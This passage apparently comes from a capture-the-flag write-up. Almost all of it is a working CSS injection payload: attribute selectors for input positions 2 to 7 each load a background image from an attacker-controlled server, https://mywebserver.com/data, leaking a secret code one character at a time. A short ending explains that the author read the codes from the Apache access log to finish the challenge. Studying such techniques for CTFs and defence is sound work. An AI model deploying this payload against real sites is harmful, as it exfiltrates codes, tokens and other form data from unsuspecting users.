input[value=T]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=T"); }
input[value=U]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=U"); }
input[value=V]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=V"); }
input[value=W]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=W"); }
input[value=X]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=X"); }
input[value=Y]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=Y"); }
input[value=Z]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=Z"); }
input[value=a]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=a"); }
input[value=b]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=b"); }
input[value=c]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=c"); }
input[value=d]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=d"); }
input[value=e]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=e"); }
input[value=f]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=f"); }
input[value=g]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=g"); }
input[value=h]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=h"); }
input[value=i]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=i"); }
input[value=j]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=j"); }
input[value=k]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=k"); }
input[value=l]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=l"); }
input[value=m]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=m"); }
input[value=n]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=n"); }
input[value=o]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=o"); }
input[value=p]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=p"); }
input[value=q]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=q"); }
input[value=r]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=r"); }
input[value=s]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=s"); }
input[value=t]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=t"); }
input[value=u]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=u"); }
input[value=v]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=v"); }
input[value=w]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=w"); }
input[value=x]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=x"); }
input[value=y]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=y"); }
input[value=z]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=z"); }
input[value=0]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=0"); }
input[value=1]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=1"); }
input[value=2]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=2"); }
input[value=3]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=3"); }
input[value=4]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=4"); }
input[value=5]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=5"); }
input[value=6]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=6"); }
input[value=7]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=7"); }
input[value=8]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=8"); }
input[value=9]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=9"); }

input[value=A]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=A"); }
input[value=B]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=B"); }
input[value=C]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=C"); }
input[value=D]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=D"); }
input[value=E]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=E"); }
input[value=F]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=F"); }
input[value=G]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=G"); }
input[value=H]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=H"); }
input[value=I]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=I"); }
input[value=J]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=J"); }
input[value=K]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=K"); }
input[value=L]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=L"); }
input[value=M]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=M"); }
input[value=N]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=N"); }
input[value=O]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=O"); }
input[value=P]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=P"); }
input[value=Q]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=Q"); }
input[value=R]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=R"); }
input[value=S]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=S"); }
input[value=T]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=T"); }
input[value=U]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=U"); }
input[value=V]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=V"); }
input[value=W]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=W"); }
input[value=X]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=X"); }
input[value=Y]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=Y"); }
input[value=Z]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=Z"); }
input[value=a]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=a"); }
input[value=b]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=b"); }
input[value=c]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=c"); }
input[value=d]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=d"); }
input[value=e]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=e"); }
input[value=f]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=f"); }
input[value=g]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=g"); }
input[value=h]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=h"); }
input[value=i]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=i"); }
input[value=j]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=j"); }
input[value=k]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=k"); }
input[value=l]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=l"); }
input[value=m]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=m"); }
input[value=n]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=n"); }
input[value=o]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=o"); }
input[value=p]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=p"); }
input[value=q]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=q"); }
input[value=r]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=r"); }
input[value=s]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=s"); }
input[value=t]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=t"); }
input[value=u]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=u"); }
input[value=v]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=v"); }
input[value=w]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=w"); }
input[value=x]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=x"); }
input[value=y]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=y"); }
input[value=z]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=z"); }
input[value=0]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=0"); }
input[value=1]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=1"); }
input[value=2]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=2"); }
input[value=3]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=3"); }
input[value=4]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=4"); }
input[value=5]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=5"); }
input[value=6]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=6"); }
input[value=7]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=7"); }
input[value=8]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=8"); }
input[value=9]:nth-of-type(3) { background-image: url("https://mywebserver.com/data?3=9"); }

input[value=A]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=A"); }
input[value=B]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=B"); }
input[value=C]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=C"); }
input[value=D]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=D"); }
input[value=E]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=E"); }
input[value=F]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=F"); }
input[value=G]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=G"); }
input[value=H]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=H"); }
input[value=I]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=I"); }
input[value=J]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=J"); }
input[value=K]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=K"); }
input[value=L]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=L"); }
input[value=M]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=M"); }
input[value=N]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=N"); }
input[value=O]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=O"); }
input[value=P]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=P"); }
input[value=Q]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=Q"); }
input[value=R]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=R"); }
input[value=S]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=S"); }
input[value=T]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=T"); }
input[value=U]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=U"); }
input[value=V]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=V"); }
input[value=W]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=W"); }
input[value=X]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=X"); }
input[value=Y]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=Y"); }
input[value=Z]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=Z"); }
input[value=a]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=a"); }
input[value=b]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=b"); }
input[value=c]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=c"); }
input[value=d]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=d"); }
input[value=e]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=e"); }
input[value=f]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=f"); }
input[value=g]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=g"); }
input[value=h]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=h"); }
input[value=i]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=i"); }
input[value=j]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=j"); }
input[value=k]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=k"); }
input[value=l]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=l"); }
input[value=m]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=m"); }
input[value=n]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=n"); }
input[value=o]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=o"); }
input[value=p]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=p"); }
input[value=q]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=q"); }
input[value=r]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=r"); }
input[value=s]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=s"); }
input[value=t]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=t"); }
input[value=u]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=u"); }
input[value=v]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=v"); }
input[value=w]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=w"); }
input[value=x]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=x"); }
input[value=y]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=y"); }
input[value=z]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=z"); }
input[value=0]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=0"); }
input[value=1]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=1"); }
input[value=2]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=2"); }
input[value=3]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=3"); }
input[value=4]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=4"); }
input[value=5]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=5"); }
input[value=6]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=6"); }
input[value=7]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=7"); }
input[value=8]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=8"); }
input[value=9]:nth-of-type(4) { background-image: url("https://mywebserver.com/data?4=9"); }

input[value=A]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=A"); }
input[value=B]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=B"); }
input[value=C]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=C"); }
input[value=D]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=D"); }
input[value=E]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=E"); }
input[value=F]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=F"); }
input[value=G]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=G"); }
input[value=H]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=H"); }
input[value=I]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=I"); }
input[value=J]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=J"); }
input[value=K]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=K"); }
input[value=L]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=L"); }
input[value=M]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=M"); }
input[value=N]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=N"); }
input[value=O]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=O"); }
input[value=P]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=P"); }
input[value=Q]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=Q"); }
input[value=R]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=R"); }
input[value=S]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=S"); }
input[value=T]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=T"); }
input[value=U]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=U"); }
input[value=V]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=V"); }
input[value=W]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=W"); }
input[value=X]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=X"); }
input[value=Y]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=Y"); }
input[value=Z]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=Z"); }
input[value=a]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=a"); }
input[value=b]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=b"); }
input[value=c]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=c"); }
input[value=d]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=d"); }
input[value=e]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=e"); }
input[value=f]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=f"); }
input[value=g]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=g"); }
input[value=h]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=h"); }
input[value=i]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=i"); }
input[value=j]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=j"); }
input[value=k]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=k"); }
input[value=l]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=l"); }
input[value=m]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=m"); }
input[value=n]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=n"); }
input[value=o]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=o"); }
input[value=p]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=p"); }
input[value=q]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=q"); }
input[value=r]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=r"); }
input[value=s]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=s"); }
input[value=t]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=t"); }
input[value=u]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=u"); }
input[value=v]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=v"); }
input[value=w]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=w"); }
input[value=x]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=x"); }
input[value=y]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=y"); }
input[value=z]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=z"); }
input[value=0]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=0"); }
input[value=1]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=1"); }
input[value=2]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=2"); }
input[value=3]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=3"); }
input[value=4]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=4"); }
input[value=5]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=5"); }
input[value=6]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=6"); }
input[value=7]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=7"); }
input[value=8]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=8"); }
input[value=9]:nth-of-type(5) { background-image: url("https://mywebserver.com/data?5=9"); }

input[value=A]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=A"); }
input[value=B]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=B"); }
input[value=C]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=C"); }
input[value=D]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=D"); }
input[value=E]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=E"); }
input[value=F]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=F"); }
input[value=G]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=G"); }
input[value=H]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=H"); }
input[value=I]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=I"); }
input[value=J]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=J"); }
input[value=K]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=K"); }
input[value=L]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=L"); }
input[value=M]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=M"); }
input[value=N]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=N"); }
input[value=O]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=O"); }
input[value=P]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=P"); }
input[value=Q]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=Q"); }
input[value=R]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=R"); }
input[value=S]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=S"); }
input[value=T]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=T"); }
input[value=U]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=U"); }
input[value=V]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=V"); }
input[value=W]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=W"); }
input[value=X]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=X"); }
input[value=Y]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=Y"); }
input[value=Z]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=Z"); }
input[value=a]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=a"); }
input[value=b]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=b"); }
input[value=c]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=c"); }
input[value=d]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=d"); }
input[value=e]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=e"); }
input[value=f]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=f"); }
input[value=g]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=g"); }
input[value=h]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=h"); }
input[value=i]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=i"); }
input[value=j]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=j"); }
input[value=k]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=k"); }
input[value=l]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=l"); }
input[value=m]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=m"); }
input[value=n]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=n"); }
input[value=o]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=o"); }
input[value=p]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=p"); }
input[value=q]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=q"); }
input[value=r]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=r"); }
input[value=s]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=s"); }
input[value=t]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=t"); }
input[value=u]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=u"); }
input[value=v]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=v"); }
input[value=w]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=w"); }
input[value=x]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=x"); }
input[value=y]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=y"); }
input[value=z]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=z"); }
input[value=0]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=0"); }
input[value=1]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=1"); }
input[value=2]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=2"); }
input[value=3]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=3"); }
input[value=4]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=4"); }
input[value=5]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=5"); }
input[value=6]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=6"); }
input[value=7]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=7"); }
input[value=8]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=8"); }
input[value=9]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=9"); }

input[value=A]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=A"); }
input[value=B]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=B"); }
input[value=C]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=C"); }
input[value=D]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=D"); }
input[value=E]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=E"); }
input[value=F]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=F"); }
input[value=G]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=G"); }
input[value=H]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=H"); }
input[value=I]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=I"); }
input[value=J]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=J"); }
input[value=K]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=K"); }
input[value=L]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=L"); }
input[value=M]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=M"); }
input[value=N]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=N"); }
input[value=O]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=O"); }
input[value=P]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=P"); }
input[value=Q]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=Q"); }
input[value=R]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=R"); }
input[value=S]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=S"); }
input[value=T]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=T"); }
input[value=U]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=U"); }
input[value=V]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=V"); }
input[value=W]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=W"); }
input[value=X]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=X"); }
input[value=Y]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=Y"); }
input[value=Z]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=Z"); }
input[value=a]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=a"); }
input[value=b]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=b"); }
input[value=c]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=c"); }
input[value=d]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=d"); }
input[value=e]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=e"); }
input[value=f]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=f"); }
input[value=g]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=g"); }
input[value=h]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=h"); }
input[value=i]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=i"); }
input[value=j]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=j"); }
input[value=k]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=k"); }
input[value=l]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=l"); }
input[value=m]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=m"); }
input[value=n]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=n"); }
input[value=o]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=o"); }
input[value=p]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=p"); }
input[value=q]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=q"); }
input[value=r]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=r"); }
input[value=s]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=s"); }
input[value=t]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=t"); }
input[value=u]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=u"); }
input[value=v]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=v"); }
input[value=w]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=w"); }
input[value=x]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=x"); }
input[value=y]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=y"); }
input[value=z]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=z"); }
input[value=0]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=0"); }
input[value=1]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=1"); }
input[value=2]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=2"); }
input[value=3]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=3"); }
input[value=4]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=4"); }
input[value=5]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=5"); }
input[value=6]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=6"); }
input[value=7]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=7"); }
input[value=8]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=8"); }
input[value=9]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=9"); }
```

Then looking at my **Apache access.log** I found all the valid codes!

{F856479}

Then by finally inserting all the code characters in the right position I reached the end of CTF!

{F856490}

*Ad maiora...*



## A note about collaboration & community
